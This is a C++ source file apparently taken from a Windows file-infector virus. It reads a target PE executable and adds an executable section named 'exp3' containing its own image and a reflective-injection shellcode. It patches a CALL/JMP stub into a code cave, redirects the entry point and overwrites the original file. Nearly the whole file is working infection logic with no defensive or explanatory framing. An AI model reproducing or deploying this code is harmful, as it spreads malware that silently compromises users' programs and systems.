#include "Infector.h"

namespace Infector
{
    bool GetFileData(const wchar_t* path, void** buffer, unsigned long* bufferSize)
    {
        bool succeed = false;
        LARGE_INTEGER fileSize;
        DWORD dwRead;
        HANDLE hFile = NULL;

        *buffer = NULL;
        *bufferSize = 0;

        do
        {
            hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
                break;

            if (!GetFileSizeEx(hFile, &fileSize))
                break;

            if (fileSize.HighPart != 0)
                break;

            *bufferSize = fileSize.LowPart;
            *buffer = custom_std::malloc(*bufferSize);
            if (*buffer == NULL)
                break;

            if (!ReadFile(hFile, *buffer, *bufferSize, &dwRead, NULL))
                break;

            succeed = true;

        } while (false);

        if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
            CloseHandle(hFile);

        if (!succeed)
        {
            *bufferSize = 0;
            if (*buffer != NULL)
            {
                custom_std::free(*buffer);
            }

        }

        return succeed;
    }

    bool SetFileData(const wchar_t* path, void* buffer, unsigned long bufferSize)
    {
        bool succeed = false;
        HANDLE hFile = NULL;
        DWORD dwWritten;
        do
        {
            hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
                break;

            if (!WriteFile(hFile, buffer, bufferSize, &dwWritten, NULL))
                break;

            succeed = true;

        } while (false);

        if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
            CloseHandle(hFile);


        return succeed;
    }

    __forceinline DWORD align(DWORD size, DWORD align, DWORD addr) 
    {
        if (!(size % align))
            return addr + size;
        return addr + (size / align + 1) * align;
    }

    bool GetExecutableShellcodeDataToInject(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
    {
        ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(GetModuleHandleA(NULL));

        PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);

        PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);

        PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);

        bool found = false;
        for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
        {
            if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
            {
                found = true;
                break;
            }
            
            pCurrentSection++;
        }

        if (!found)
        {
            // Take current executable
            wchar_t path[MAX_PATH * 2];

            // GetModuleFileName retrieves the path of the executable file of the current process
            DWORD result = GetModuleFileNameW(NULL, path, sizeof(path));
            if (result > 0)
            {
                void* fileBuffer;
                unsigned long fileBufferSize;

                // Add the reflective injector shellcode
                GetFileData(path, &fileBuffer, &fileBufferSize);

                void* sectionReflectiveShellcode = ReflectiveInjectionShellcode;
                unsigned int sectionReflectiveShellcodeSize = (ULONG_PTR)ReflectiveInjectionShellcode_Marked - (ULONG_PTR)ReflectiveInjectionShellcode;

                *bufferSize = fileBufferSize + sectionReflectiveShellcodeSize;
                *buffer = custom_std::malloc(*bufferSize);
                
                custom_std::memcpy(*buffer, sectionReflectiveShellcode, sectionReflectiveShellcodeSize);
                custom_std::memcpy(reinterpret_cast<void*>(reinterpret_cast<ULONG_PTR>(*buffer) + sectionReflectiveShellcodeSize),
                    fileBuffer,
                    fileBufferSize);


                return true;
            }
            else
            {
                return false;
            }
        }
        else
        {
            // Read the section
            *bufferSize = pCurrentSection->SizeOfRawData;
            *buffer = custom_std::malloc(pCurrentSection->SizeOfRawData);

            custom_std::memcpy(*buffer, reinterpret_cast<void*>(pModule + pCurrentSection->VirtualAddress), *bufferSize);
        }

    }

    bool InfectExecutable(
        void* executableBuffer, 
        unsigned long executableBufferSize, 
        void* shellcodeJumperBuffer, 
        unsigned long shellcodeJumperBufferSize, 
        void* shellcodeBuffer, 
        unsigned long shellcodeBufferSize, 
        void** infectedExecutableBuffer, 
        unsigned long* infectedExecutableBufferSize,
        char* sectionName,
        unsigned int sectionNameSize)
    {

        if (reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer)->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        PIMAGE_DOS_HEADER pOriginalDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer);
        PIMAGE_NT_HEADERS pOriginalNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(executableBuffer) + pOriginalDosHeader->e_lfanew);

        PIMAGE_SECTION_HEADER pFirstSection = reinterpret_cast<PIMAGE_SECTION_HEADER>((ULONG_PTR)&pOriginalNtHeaders->OptionalHeader + pOriginalNtHeaders->FileHeader.SizeOfOptionalHeader);
        PIMAGE_SECTION_HEADER pLastSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections - 1]);
        PIMAGE_SECTION_HEADER pNewSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections]);

        custom_std::memset(pNewSection, 0x00, sizeof(IMAGE_SECTION_HEADER));

        custom_std::memcpy(pNewSection->Name, sectionName, sectionNameSize);

        pNewSection->Misc.VirtualSize = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, 0);
        pNewSection->VirtualAddress = align(pLastSection->Misc.VirtualSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, pLastSection->VirtualAddress);
        pNewSection->SizeOfRawData = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.FileAlignment, 0);
        pNewSection->PointerToRawData = align(pLastSection->SizeOfRawData, pOriginalNtHeaders->OptionalHeader.FileAlignment, pLastSection->PointerToRawData);
        pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

        *infectedExecutableBufferSize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;
        *infectedExecutableBuffer = custom_std::malloc(*infectedExecutableBufferSize);

        for (size_t i = 0; i < pOriginalNtHeaders->OptionalHeader.SizeOfHeaders; i++)
        {
            ((BYTE*)*infectedExecutableBuffer)[i] = ((BYTE*)executableBuffer)[i];
        }
        
        PIMAGE_DOS_HEADER pInfectedDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(*infectedExecutableBuffer);
        PIMAGE_NT_HEADERS pInfectedNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(*infectedExecutableBuffer) + pInfectedDosHeader->e_lfanew);

        PIMAGE_SECTION_HEADER pTempSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);

        custom_std::memcpy(&(pTempSection[pInfectedNtHeaders->FileHeader.NumberOfSections]), pNewSection, sizeof(IMAGE_SECTION_HEADER));

        pInfectedNtHeaders->FileHeader.NumberOfSections += 1;
        pInfectedNtHeaders->OptionalHeader.SizeOfImage = pNewSection->VirtualAddress + pNewSection->Misc.VirtualSize;

        custom_std::memset(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), 0x00, pNewSection->SizeOfRawData);
        custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), reinterpret_cast<void*>(shellcodeBuffer), shellcodeBufferSize);

        PIMAGE_SECTION_HEADER pCurrentInfectedSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
        PIMAGE_SECTION_HEADER pCurrentOriginalSection = IMAGE_FIRST_SECTION(pOriginalNtHeaders);
        for (size_t i = 0; i < pOriginalNtHeaders->FileHeader.NumberOfSections; i++)
        {
            custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pCurrentInfectedSection->PointerToRawData),
                reinterpret_cast<void*>((ULONG_PTR)(executableBuffer) + pCurrentOriginalSection->PointerToRawData),
                pCurrentOriginalSection->SizeOfRawData);

            pCurrentInfectedSection++;
            pCurrentOriginalSection++;
        }

        // Search for code cave in .text section
        PIMAGE_SECTION_HEADER pInfectedTextSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
        for (size_t i = 0; i < pInfectedNtHeaders->FileHeader.NumberOfSections; i++)
        {
            if (pInfectedTextSection->VirtualAddress <= pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint && pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint <= (pInfectedTextSection->VirtualAddress + pInfectedTextSection->Misc.VirtualSize))
            {
                break;
            }

            pInfectedTextSection++;
        }
        const unsigned char codeCaveValue = 0x00;
        unsigned long foundCodeCaveIndex = -1;
        for (size_t i = 0; i < pInfectedTextSection->SizeOfRawData - shellcodeJumperBufferSize; i++)
        {
            bool foundPattern = true;
            for (size_t j = 0; j < shellcodeJumperBufferSize; j++)
            {
                if (reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + i + j] != codeCaveValue)
                {
                    foundPattern = false;
                    break;
                }
            }

            if (foundPattern)
            {
                foundCodeCaveIndex = i;
                break;
            }
        }
        
        // Dont forget to cleanup data
        if (foundCodeCaveIndex == -1)
            return false;

        ULONG_PTR codeCaveVirtualAddress = foundCodeCaveIndex + pInfectedTextSection->VirtualAddress;

        // Now set the code cave inside
        for (size_t i = 0; i < shellcodeJumperBufferSize - sizeof(DWORD); i++)
        {
            // new main pointer
            if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x01234567)
            {
                *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pCurrentInfectedSection->VirtualAddress - (codeCaveVirtualAddress + i + 4);
            }

            // old main pointer
            if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x89ABCDEF)
            {
                *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint - (codeCaveVirtualAddress + i + 4);
            }
        }

        BYTE* codeCaveShellcodePointer = &reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + foundCodeCaveIndex];
        custom_std::memcpy(codeCaveShellcodePointer, shellcodeJumperBuffer, shellcodeJumperBufferSize);

        // Set entrypoint
        pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint = codeCaveVirtualAddress;
        
        return true;
    }


    bool InfectFile(const wchar_t* path)
    {
        void* executableBuffer;
        unsigned long executableBufferSize;

        void* infectedExecutableBuffer;
        unsigned long infectedExecutableBufferSize;

        void* sectionData;
        unsigned long sectionDataSize;

        unsigned char sectionName[] = { 'e', 'x', 'p', '3', '\x00' };

        unsigned char shellcodeJumper[11];
        shellcodeJumper[0] = 0xE8; // CALL REL
        *reinterpret_cast<DWORD*>(&shellcodeJumper[1]) = 0x01234567; // Relative address of new main function
        shellcodeJumper[sizeof(DWORD) + 1] = 0xE9; // JMP REL
        *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 2]) = 0x89ABCDEF; // Relative address of old main function

        if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
        {
            return false;
        }

        // don't forget to do cleanup after
        if (!GetFileData(path, &executableBuffer, &executableBufferSize))
        {
            return false;
        }

        if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
        {
            return false;
        }

        if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
        {
            return false;
        }

        return true;
    }

}



